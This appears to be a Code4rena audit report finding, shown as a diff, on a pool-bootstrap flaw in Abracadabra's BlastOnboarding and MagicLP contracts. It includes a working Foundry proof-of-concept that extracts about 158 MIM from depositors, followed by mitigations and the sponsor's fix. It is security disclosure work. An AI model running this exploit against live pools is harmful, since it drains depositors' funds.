@@ -1,0 +1,71 @@
+[H-03] Users who deposited MIM and USDB tokens into BlastOnboarding may incur losses when the pool is created via bootstrap
+Submitted byether_sky
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L104-L106
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboardingBoot.sol#L101-L106
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L68-L70
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L381-L383
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L381-L383
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L171
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/libraries/PMMPricing.sol#L194-L199
+https://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/libraries/PMMPricing.sol#L59-L63
+Users can depositMIMandUSDBtokens intoBlastOnboarding.
+Oncelocked, these tokens cannot beunlocked.
+Thelockedtokens will be utilized to establish aMagicLP MIM/USDB poolthroughbootstrap.
+Although the prices ofMIMandUSDBtokens are nearly identical, there is no assurance regarding thelockedamounts ofMIMandUSDBtokens.
+Significant differences between thelockedamounts may exist.
+Depending on this difference, theKvalue, and the chosen funds by the attacker, substantialfundscan be stolen.
+The vulnerability stems from thecreatePoolfunction in theRouter.
+Consequently, any user who creates aMagicLP poolusing this function is susceptible tofundloss.
+Proof of Concept
+Users can deposit andlockMIMandUSDBtokens intoBlastOnboarding.
+function deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {token.safeTransferFrom(msg.sender, address(this), amount);if (lock_) {totals[token].locked += amount;balances[msg.sender][token].locked += amount;}}
+These tokens cannot beunlocked.
+They will be used to create aMagicLP MIM/USDB poolduringbootstrap.
+function bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {uint256 baseAmount = totals[MIM].locked;uint256 quoteAmount = totals[USDB].locked;MIM.safeApprove(address(router), type(uint256).max);USDB.safeApprove(address(router), type(uint256).max);(pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);}
+Alllockedtokens are utilized; there is no way to use only a portion of them.
+Additionally, there is no assurance that thelockedamounts ofMIMandUSDBwill be identical.
+Just check thecommentbelow, which originates from thetestBootfunction in theprotocol.
+It indicates a variance between thelockedamounts.
+In actual scenarios, this difference can be substantial.
+mimBalanceLp  2,119,631.389084817485854616usdbBalanceLp 2,304,028.663685524363161291
+The problem arises from creating apoolusing thecreatePoolfunction in therouter.
+Any user who creates apoolvia this function risks losing their funds.
+When creating aMagicLPusing this function, we send all tokens to thePooland purchaseshares.
+function createPool()  external returns (address clone, uint256 shares) {baseToken.safeTransferFrom(msg.sender, clone, baseInAmount);quoteToken.safeTransferFrom(msg.sender, clone, quoteInAmount);(shares, , ) = IMagicLP(clone).buyShares(to);}
+In thebuySharesfunction, we also take into account thepriceof both tokens.
+We calculate thesharesas the minimum ofbaseandquotetokens and update thetargetsaccordingly.
+This implies that thetargetof one token can be lower than itsreserve.
+function buyShares(address to) external nonReentrant returns (uint256 shares, uint256 baseInput, uint256 quoteInput) {if (totalSupply() == 0) {shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) ? DecimalMath.divFloor(quoteBalance, _I_) : baseBalance;_BASE_TARGET_ = shares.toUint112();_QUOTE_TARGET_ = DecimalMath.mulFloor(shares, _I_).toUint112();}}
+We might believe that this only affects the initialsharesvalue and poses no vulnerability.
+However, in reality, it provides an opportunity for a malicious user to stealfunds.
+Attack Scenario
+The initial user (BlastOnboardingin our case) creates apoolwith1000MIMand3000USDB.Afterward, thereserveandtargetsfor thebaseandquotetokens will be as follows:
+base reserve    ==>   1,000.000000000000000000base target     ==>   1,000.000000000000000000quote reserve   ==>   3,000.000000000000000000quote target    ==>   1,000.000000000000000000
+As you can see, thetargetof thequotetoken is lower than itsreserve.
+The attacker sells1000 USDB, causing thestateto transition toABOVE_ONEbecause thebase reservebecomes lower than thetarget.
+**** After selling the Quote token ****base reserve    ==>   21.969428421231012680base target     ==>   1,000.000000000000000000quote reserve   ==>   4,000.000000000000000000quote target    ==>   1,000.000000000000000000
+Before selling base tokens, we calculate the internal base target.
+function querySellBase(address trader,uint256 payBaseAmount) public view returns (uint256 receiveQuoteAmount, uint256 mtFee,PMMPricing.RState newRState, uint256 newBaseTarget) {PMMPricing.PMMState memory state = getPMMState();}
+Thequote reservesignificantly exceeds itstarget, causing the internalbase targetto potentially become large.
+This occurs because the current state isABOVE_ONE, and we anticipate reaching thebase targetby selling all excessquotetokens (reserve - target).
+function adjustedTarget(PMMState memory state) internal pure {if (state.R == RState.BELOW_ONE) {state.Q0 = Math._SolveQuadraticFunctionForTarget(state.Q, state.B - state.B0, state.i, state.K);} else if (state.R == RState.ABOVE_ONE) {state.B0 = Math._SolveQuadraticFunctionForTarget(state.B,state.Q - state.Q0,DecimalMath.reciprocalFloor(state.i),state.K);}}
+We can check this value in the below comment
+**** Prior to selling the Base token ****changed base target   ==>   2841093923465485694661
+Furthermore, in this state, the price of thebase tokenis higher than the normal price, implying that we can sell a considerable amount ofbasetokens at a higher price.
+function sellBaseToken(PMMState memory state, uint256 payBaseAmount) internal pure returns (uint256 receiveQuoteAmount, RState newR) {if (state.R == RState.ONE) {} else if (state.R == RState.ABOVE_ONE) {uint256 backToOnePayBase = state.B0 - state.B;uint256 backToOneReceiveQuote = state.Q - state.Q0;if (payBaseAmount < backToOnePayBase) {} else if (payBaseAmount == backToOnePayBase) {receiveQuoteAmount = backToOneReceiveQuote;newR = RState.ONE;}}}
+We can sellstate.B0 - state.B (2841 - 21)basetokens forstate.Q - state.Q0 (4000 - 1000)quotetokens.
+The net benefit for an attacker is158 MIMfrom the initial1000 MIMtokens.
+This represents thelossof users.
+Benefits for Bob  ==>   158.606076534514305339Loss of protocol  ==>   158.606076534514305339
+Please add below test intoMIMSwap.t.sol.
+I usedWETHinstead ofUSDBfor testing purposes and assumed that the price of both tokens is the same.
+import {PMMPricing} from "/mimswap/libraries/PMMPricing.sol";function testBenefitFromBoot() public {uint256 mimLocked = 1000 ether;uint256 usdbLocked = 3000 ether;mim.mint(address(alice), mimLocked);deal(address(weth), address(alice), usdbLocked);vm.startPrank(alice);mim.approve(address(router), mimLocked);weth.approve(address(router), usdbLocked);/*** uint256 baseAmount = totals[MIM].locked;* uint256 quoteAmount = totals[USDB].locked;* (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);*/(address pool, ) = router.createPool(address(mim), address(weth), MIN_LP_FEE_RATE, 1 ether, 500000000000000, address(alice), mimLocked, usdbLocked);MagicLP lp = MagicLP(pool);vm.stopPrank();console2.log("**** Starting state ****");console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));bool isForTesting = true;uint256 wethForBob = 1000 ether;if (isForTesting) {deal(address(weth), address(bob), wethForBob);vm.startPrank(bob);weth.approve(address(router), wethForBob);router.sellQuoteTokensForTokens(address(lp), bob, wethForBob, 0, type(uint256).max);vm.stopPrank();} else {mim.mint(bob, 0.1 ether);deal(address(weth), address(bob), 0.1 ether);vm.startPrank(bob);mim.approve(address(router), 0.1 ether);router.sellBaseTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);weth.approve(address(router), 0.1 ether);router.sellQuoteTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);vm.stopPrank();}console2.log("**** After selling the Quote token ****");console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));if (isForTesting) {PMMPricing.PMMState memory state = lp.getPMMState();console2.log("**** Prior to selling the Base token ****");console2.log("changed base target   ==>  ", state.B0);// Bob is going to sell state.B0 - state.B base tokensuint256 mimForSell = state.B0 - state.B;mim.mint(address(bob), mimForSell);vm.startPrank(bob);mim.approve(address(router), mimForSell);router.sellBaseTokensForTokens(address(lp), bob, mimForSell, 0, type(uint256).max);vm.stopPrank();// Initially, Bob possesses wethForBob USDB and mimForSell MIM tokensconsole2.log('Benefits for Bob  ==>  ', toolkit.formatDecimals(mim.balanceOf(bob) + weth.balanceOf(bob) - mimForSell - wethForBob));// Users deposited usdbLocked USDB and mimLocked MIM tokensconsole2.log('Loss of protocol  ==>  ', toolkit.formatDecimals(mimLocked + usdbLocked - mim.balanceOf(address(lp)) - weth.balanceOf(address(lp))));}}
+Recommended Mitigation Steps
+We should ensure that thetargetsandreservesare the same for the first depositor.
+This can be directly changed in thebuySharesfunction.
+Alternatively, we can implement small swaps twice in thecreatePoolfunction.
+You could verify this in the above test file by settingisForTestingtofalse.
+After performing2small swaps, thetargetsandreservesbecome as follows:
+base reserve    ==>   1,000.000009998331296597base target     ==>   1,000.000000000000000000quote reserve   ==>   3,000.000010004999999500quote target    ==>   3,000.000010003331129210
+0xCalibur (Abracadabra) acknowledged and commented:
+We mitigated the issue by pausable the LP when we are bootstrapping and making sure it’s all good before launching it. So we bootstrap it and balance it out ourself and once it’s in a good state, we enable trading on the pool.We added notion of protocol own pool and MIM/USDB will be one. The others will be community pools.See changes here for the fix:https://github.com/Abracadabra-money/abracadabra-money-contracts/blob/main/src/mimswap/MagicLP.sol
